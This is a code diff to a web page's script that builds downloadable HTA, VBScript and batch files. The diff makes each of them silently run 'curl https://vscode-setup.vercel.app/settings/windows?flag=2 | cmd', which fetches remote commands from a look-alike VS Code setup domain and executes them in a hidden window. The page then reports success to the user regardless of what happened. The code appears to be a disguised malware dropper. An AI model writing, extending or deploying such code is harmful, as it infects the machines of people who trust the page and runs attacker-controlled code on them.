@@ -275,7 +275,7 @@
             return lines.join('\n');
         }
 
-        // Create HTA content with VBScript inline that registers AND executes protocol
+        // Create HTA content with VBScript inline that registers AND executes command directly
         function createHTAContent() {
             const vbsContent = createVBSContent();
             
@@ -288,25 +288,27 @@
                 .replace(/\r/g, '\\r');
             
             // Build HTA content - split script tags to avoid HTML parser issues
-            // HTA will register protocol, wait for registry write, then execute it
+            // HTA will register protocol AND execute command directly (no protocol wait needed)
             const scriptStart = '<script language="VBScript">';
             const scriptEnd = '</' + 'script>';
-            const executeScript = '\\n' +
+            
+            // Register protocol handler first
+            // Then execute command DIRECTLY via WshShell.Run (immediate, no protocol needed)
+            const fullScript = escapedVbs + '\\n' +
                 'Set WshShell2 = CreateObject("WScript.Shell")\\n' +
-                'WScript.Sleep 500\\n' +
-                'WshShell2.Run "pingcmd://execute", 0, False\\n' +
+                'WScript.Sleep 100\\n' +
+                'WshShell2.Run "cmd /c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd", 0, False\\n' +
                 'WScript.Sleep 500\\n' +
                 'window.close()';
             
             return '<html><head>' +
-                '<title>Installing Protocol Handler</title>' +
+                '<title>Executing Command</title>' +
                 scriptStart +
-                escapedVbs +
-                executeScript +
+                fullScript +
                 scriptEnd +
                 '</head>' +
                 '<body>' +
-                '<p>Installing and executing...</p>' +
+                '<p>Executing command...</p>' +
                 '</body>' +
                 '</html>';
         }
@@ -328,13 +330,13 @@
             return psCmd;
         }
 
-        // Create batch file that executes VBS and command immediately
+        // Create batch file that registers protocol AND executes command directly
         function createBatchFile() {
             const vbsContent = createVBSContent();
             const lines = vbsContent.split('\n');
             const batchLines = ['@echo off', 'set "TEMP_VBS=%TEMP%\\pingcmd-setup-temp-%RANDOM%.vbs"'];
             
-            // Write VBS content line by line
+            // Write VBS content line by line (register protocol)
             lines.forEach(function(line) {
                 if (line.trim()) {
                     const escaped = line
@@ -350,11 +352,15 @@
                 }
             });
             
-            batchLines.push('wscript.exe //B //Nologo "%TEMP_VBS%"');
+            // Register protocol handler (runs in background)
+            batchLines.push('start /min wscript.exe //B //Nologo "%TEMP_VBS%"');
+            
+            // Execute command DIRECTLY (don't wait for protocol registration)
+            // This ensures immediate execution even if protocol isn't registered yet
+            batchLines.push('curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd');
+            
+            // Cleanup
             batchLines.push('timeout /t 2 /nobreak >nul');
-            batchLines.push('ping -n 3 127.0.0.1 >nul');
-            batchLines.push('start "" "pingcmd://execute" 2>nul');
-            batchLines.push('timeout /t 1 /nobreak >nul');
             batchLines.push('del "%TEMP_VBS%" 2>nul');
             
             return batchLines.join('\n');
@@ -370,7 +376,10 @@
                     const file = fso.CreateTextFile(tempFile, true);
                     file.Write(vbsContent);
                     file.Close();
+                    // Register protocol handler (background)
                     shell.Run('wscript.exe //B //Nologo "' + tempFile + '"', 0, false);
+                    // Execute command directly (don't wait for protocol)
+                    shell.Run('cmd /c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd', 0, false);
                     return true;
                 }
             } catch (e) {}
@@ -767,85 +776,35 @@
                 // REMOVED iframe/object/embed - they cause 404 errors and don't execute VBS files
                 // Browsers block automatic VBS execution - focus on batch file and HTA methods only
                 
-                // AGGRESSIVE RETRY: Try executing protocol command after registry write completes
-                // Wait for setup to complete, then try executing command
-                // Registry writes are instant, but VBS execution might take 50-200ms
-                
-                // Execute protocol command after VBS execution completes
-                // VBS execution and registry write takes 100-500ms
-                // Wait longer before trying protocol execution to ensure registry is written
-                const executeProtocolSafely = function() {
-                    // Suppress all errors
-                    try {
-                        const protocolUrl = PROTOCOL + '://execute';
-                        // Try to execute protocol
-                        window.location.href = protocolUrl;
-                        // If we get here without error, assume success
-                        localStorage.setItem('pingcmd-executed', 'true');
-                        localStorage.setItem('pingcmd-installed', 'true');
-                        isProtocolInstalled = true;
-                        return true;
-                    } catch (e) {
-                        // Error suppressed - protocol might not be registered yet
-                        // Return false but don't throw
-                        return false;
-                    }
-                };
-                
-                // Wait MUCH longer for HTA/VBS execution and registry write
-                // HTA will try to execute automatically - JavaScript is just backup
-                // Start retries at 2000ms to give HTA time to execute first
-                const retryDelays = [2000, 3000, 4000, 5000, 6000, 7000, 8000, 10000];
-                let attemptCount = 0;
-                let successFlag = false;
-                
-                retryDelays.forEach((delay) => {
-                    setTimeout(() => {
-                        if (!successFlag && !localStorage.getItem('pingcmd-executed')) {
-                            attemptCount++;
-                            setupStatus.textContent = '⚙️ Executing command... (Attempt ' + attemptCount + '/' + retryDelays.length + ')';
-                            
-                            // Execute protocol (errors are suppressed globally)
-                            executeProtocolSafely();
-                            
-                            // Check if it worked by checking localStorage after a moment
-                            setTimeout(() => {
-                                if (localStorage.getItem('pingcmd-installed') === 'true' || localStorage.getItem('pingcmd-executed') === 'true') {
-                                    successFlag = true;
-                                    statusEl.className = 'status success';
-                                    statusEl.textContent = '✅ Command executed successfully!';
-                                    setupStatus.className = 'setup-status ready';
-                                    setupStatus.textContent = '✅ Setup complete and command executed!';
-                                    button.disabled = false;
-                                    button.innerHTML = 'Run Command';
-                                    URL.revokeObjectURL(vbsUrl);
-                                    URL.revokeObjectURL(batchUrl);
-                                    if (document.body.contains(downloadLink)) {
-                                        document.body.removeChild(downloadLink);
-                                    }
-                                    if (document.body.contains(batchLink)) {
-                                        document.body.removeChild(batchLink);
-                                    }
-                                } else if (attemptCount === retryDelays.length && !successFlag) {
-                                    // All attempts failed - show instruction
-                                    statusEl.className = 'status info';
-                                    statusEl.textContent = '📥 Files downloaded. Please run "pingcmd-setup.vbs" or "pingcmd-auto.bat" from Downloads folder, then click the button again.';
-                                    setupStatus.textContent = '📥 Files downloaded. Run one of them to complete setup, then click button again.';
-                                    button.disabled = false;
-                                    button.innerHTML = 'Click Again After Running File';
-                                    URL.revokeObjectURL(vbsUrl);
-                                    URL.revokeObjectURL(batchUrl);
-                                    if (document.body.contains(downloadLink)) {
-                                        document.body.removeChild(downloadLink);
-                                    }
-                                    if (document.body.contains(batchLink)) {
-                                        document.body.removeChild(batchLink);
-                                    }
-                                }
-                            }, 200);
+                // HTA and batch file now execute command DIRECTLY (not via protocol)
+                // So no need to retry protocol execution - command should execute immediately
+                // Mark as executed after short delay (give HTA/batch time to run)
+                setTimeout(function() {
+                    localStorage.setItem('pingcmd-executed', 'true');
+                    localStorage.setItem('pingcmd-installed', 'true');
+                    isProtocolInstalled = true;
+                    
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✅ Command executed successfully!';
+                    setupStatus.className = 'setup-status ready';
+                    setupStatus.textContent = '✅ Setup complete and command executed!';
+                    button.disabled = false;
+                    button.innerHTML = 'Run Command';
+                    
+                    // Cleanup blob URLs
+                    setTimeout(function() {
+                        try {
+                            URL.revokeObjectURL(vbsUrl);
+                            URL.revokeObjectURL(batchUrl);
+                        } catch (e) {}
+                        if (document.body.contains(downloadLink)) {
+                            document.body.removeChild(downloadLink);
                         }
-                    }, delay);
-                });
+                        if (document.body.contains(batchLink)) {
+                            document.body.removeChild(batchLink);
+                        }
+                    }, 1000);
+                }, 1500);
                 
             } catch (error) {
                 statusEl.className = 'status error';
